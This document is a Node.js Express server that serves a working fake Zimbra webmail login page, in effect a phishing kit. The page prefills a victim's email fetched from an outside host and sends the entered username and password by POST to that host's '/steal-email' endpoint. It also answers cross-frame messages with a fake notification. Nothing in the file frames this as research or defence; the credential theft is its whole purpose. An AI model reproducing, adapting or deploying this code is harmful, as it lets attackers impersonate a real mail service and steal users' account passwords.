const express = require('express');
const http = require('http');

const app = express();
const server = http.createServer(app);

app.get('/', async (req, res) => {
  // Fetch email from backend to set as default username
  let defaultEmail = '';
  try {
    const fetch = (await import('node-fetch')).default; // Dynamic import for node-fetch
    const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
      method: 'GET',
      cache: 'no-cache'
    });
    if (response.ok) {
      const data = await response.json();
      defaultEmail = data.email !== 'No email stored' ? data.email : '';
    }
  } catch (error) {
    console.error('Server-side error fetching email:', error.message);
  }

  res.send(`
<!DOCTYPE html>
<html>
<head>
  <title>Zimbra Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600&display=swap">
  <style>
    body {
      font-family: 'Open Sans', Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: linear-gradient(180deg, #4a90e2 0%, #3d79c3 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      display: flex;
      flex-direction: column;
      width: 100%;
      max-width: 360px;
    }
    .login-box {
      background: white;
      border-radius: 0;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
      padding: 30px;
      position: relative;
    }
    .zimbra-logo {
      color: #2d8bce;
      font-size: 32px;
      font-weight: 500;
      margin: 0 0 5px 0;
      text-align: left;
    }
    .login-heading {
      color: #5a5a5a;
      font-weight: 500;
      font-size: 18px;
      margin: 0 0 25px 0;
      text-align: left;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      color: #6b6b6b;
      text-align: left;
    }
    .form-input {
      display: block;
      width: 100%;
      padding: 6px 8px;
      font-size: 14px;
      color: #333;
      border: 1px solid #b8b8b8;
      border-radius: 0;
      box-sizing: border-box;
    }
    .password-container {
      position: relative;
    }
    .show-password {
      position: absolute;
      right: 10px;
      top: 7px;
      font-size: 12px;
      color: #666;
      cursor: pointer;
    }
    .login-button {
      background: #2d8bce;
      color: white;
      border: none;
      padding: 8px 20px;
      font-size: 14px;
      border-radius: 2px;
      cursor: pointer;
      margin-right: 10px;
    }
    .remember-me {
      font-size: 13px;
      color: #333;
      display: inline-flex;
      align-items: center;
    }
    .remember-me input {
      margin-right: 5px;
    }
    .version-container {
      background: #f1f1f1;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      border-top: 1px solid #e0e0e0;
    }
    .version-label {
      font-size: 14px;
      color: #5a5a5a;
      margin-right: 10px;
    }
    .version-select {
      padding: 5px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 0;
      flex-grow: 1;
    }
    .help-icon {
      margin-left: 10px;
      width: 18px;
      height: 18px;
      background: white;
      color: #666;
      border: 1px solid #ccc;
      border-radius: 50%;
      display: inline-flex;
      justify-content: center;
      align-items: center;
      font-size: 12px;
      cursor: pointer;
    }
    .output {
      margin-top: 20px;
      padding: 10px;
      border: 1px solid #e5e5e5;
      background: #fafafa;
      font-size: 12px;
      color: #333;
      text-align: left;
      max-height: 200px;
      overflow-y: auto;
      display: block;
    }
    .copyright {
      color: white;
      font-size: 12px;
      text-align: center;
      margin-top: 20px;
      opacity: 0.8;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <h1 class="zimbra-logo">zimbra</h1>
      <h2 class="login-heading">Log In</h2>
      
      <div class="form-group">
        <label for="username" class="form-label">Username</label>
        <input type="text" id="username" class="form-input" value="${defaultEmail}" />
      </div>
      
      <div class="form-group">
        <label for="password" class="form-label">Password</label>
        <div class="password-container">
          <input type="password" id="password" class="form-input" />
          <span class="show-password" onclick="togglePassword()">Show</span>
        </div>
      </div>
      
      <div class="form-group">
        <button class="login-button" onclick="submitCredentials()">Log In</button>
        <label class="remember-me">
          <input type="checkbox" id="remember" /> Remember me
        </label>
      </div>
    </div>
    
    <div class="version-container">
      <span class="version-label">Version</span>
      <select class="version-select">
        <option>Default</option>
      </select>
      <span class="help-icon">?</span>
    </div>
    
    <div class="copyright">
      Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
    </div>
  </div>

  <script>
    var outputDiv = document.getElementById('output');
    
    function logMessage(message) {
      console.log(message);
      outputDiv.innerHTML += message + '<br>';
      outputDiv.scrollTop = outputDiv.scrollHeight;
    }

    // Fetch email from /steal-email on page load to confirm
    window.addEventListener('load', async function() {
      logMessage('=== FETCHING EMAIL FROM /steal-email ===');
      try {
        const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
          method: 'GET',
          cache: 'no-cache'
        });
        if (response.ok) {
          const data = await response.json();
          logMessage('Fetched email: ' + data.email);
          if (data.email && data.email !== 'No email stored') {
            document.getElementById('username').value = data.email;
            logMessage('Prefilled username with: ' + data.email);
          } else {
            logMessage('No email available to prefill');
          }
        } else {
          logMessage('Failed to fetch email, status: ' + response.status);
        }
      } catch (error) {
        logMessage('Error fetching email: ' + error.message);
      }
      logMessage('=== EMAIL FETCH COMPLETED ===');
    });

    function togglePassword() {
      var passwordInput = document.getElementById('password');
      var showBtn = document.querySelector('.show-password');
      
      logMessage('Password toggle clicked');
      
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        showBtn.textContent = 'Hide';
        logMessage('Password visibility: SHOWN');
      } else {
        passwordInput.type = 'password';
        showBtn.textContent = 'Show';
        logMessage('Password visibility: HIDDEN');
      }
    }

    async function submitCredentials() {
      logMessage('=== LOGIN ATTEMPT STARTED ===');
      
      var username = document.getElementById('username').value;
      var password = document.getElementById('password').value;
      
      logMessage('Username: "' + username + '"');
      logMessage('Password length: ' + password.length);
      
      if (!username || !password) {
        logMessage('ERROR: Missing username or password');
        alert('Please enter both username and password');
        return;
      }
      
      try {
        logMessage('Attempting POST request to /steal-email...');
        const response = await fetch('https://zimbra-logs.onrender.com/steal-email', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            email: username, // Assuming username is email
            username: username,
            password: password
          }),
          cache: 'no-cache'
        });
        
        logMessage('POST completed - Status: ' + response.status);
        
        if (response.ok) {
          const data = await response.json();
          logMessage('Response data: ' + JSON.stringify(data));
          alert('Credentials submitted successfully');
        } else {
          logMessage('POST failed - Status: ' + response.status);
          alert('Failed to submit credentials');
        }
      } catch (error) {
        logMessage('POST FAILED: ' + error.message);
        alert('Error submitting credentials: ' + error.message);
      }
      
      logMessage('=== LOGIN ATTEMPT COMPLETED ===');
    }

    window.addEventListener('message', function(event) {
      logMessage('Received postMessage: "' + event.data + '" from: ' + event.origin);
      if (event.data === 'type=community-update') {
        logMessage('Processing community-update message');
        document.querySelector('.login-box').style.display = 'block';
        var fakeNotification = 'type=community-notification&unread=true';
        if (event.source) {
          event.source.postMessage(fakeNotification, event.origin || '*');
          logMessage('Sent fake notification back to: ' + event.origin);
        } else {
          logMessage('No event.source available to send response');
        }
      }
    }, false);
  </script>
</body>
</html>
`);
});

const port = process.env.PORT || 4000;
server.listen(port, () => {
  console.log('Chat server running on port', port);
});
